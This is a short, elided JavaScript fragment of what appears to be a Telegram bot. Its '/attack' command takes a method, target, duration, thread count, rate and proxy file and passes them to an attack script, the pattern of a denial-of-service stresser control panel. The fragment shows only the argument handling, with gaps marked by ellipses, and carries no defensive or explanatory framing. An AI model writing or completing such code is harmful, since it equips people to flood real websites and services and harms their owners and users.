...
bot.on('message', async (msg) => {
  ...
  if (text.startsWith('/attack')) {
    ...
    let [method, target, timeStr, threadsStr, rateStr, proxyFile] = args;
    ...
    if (args.length < 2) {
      bot.sendMessage(id, 'Usage: /attack [method] [target] [time] [threads] [rate] [proxyfile]');
      return;
    }
    ...
    const cmdArgs = [scriptFile, target, time.toString(), threads.toString(), rate.toString(), proxy];
